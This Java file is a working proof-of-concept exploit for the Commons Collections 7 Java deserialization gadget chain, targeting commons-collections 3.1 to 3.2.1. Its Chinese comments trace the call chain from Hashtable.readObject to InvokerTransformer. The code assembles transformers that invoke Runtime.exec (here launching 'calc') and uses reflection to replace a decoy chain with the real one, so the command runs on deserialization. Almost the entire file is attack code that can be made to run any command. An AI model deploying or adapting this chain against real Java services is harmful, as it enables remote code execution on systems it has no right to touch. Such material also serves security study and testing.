import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

import static util.Util.serialize;
import static util.Util.unserialize;

/*调用链:
Hashtable.readObject()
    Hashtable.reconstitutionPut()
        HashMap.put()
            HashMap.hash()
                TiedMapEntry.hashCode()
                    LazyMap.get()
                        ChainedTransformer.transform()
                            InvokerTransformer.transform()
* */
/*版本依赖commons-collections : 3.1～3.2.1*/
/*注，基本跟HashMap一致*/
public class CommonCollection7 {
    public static void main(String[] args) throws Exception{
        Transformer[] transformers=new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class, Class[].class}, new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class, Object[].class}, new Class[]{Runtime.class, null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        };
        ChainedTransformer fakechain = new ChainedTransformer(new Transformer[]{});
        Hashtable hashtable=new Hashtable();
        Map lazyMap = LazyMap.decorate(new HashMap(),fakechain);
        TiedMapEntry tiedMapEntry =new TiedMapEntry(lazyMap,"dragonkeep");
        hashtable.put(tiedMapEntry,"dragonkeep");

        Field field=ChainedTransformer.class.getDeclaredField("iTransformers");
        field.setAccessible(true);
        field.set(fakechain,transformers);
        lazyMap.clear();
        serialize(hashtable);
        unserialize();
    }
}
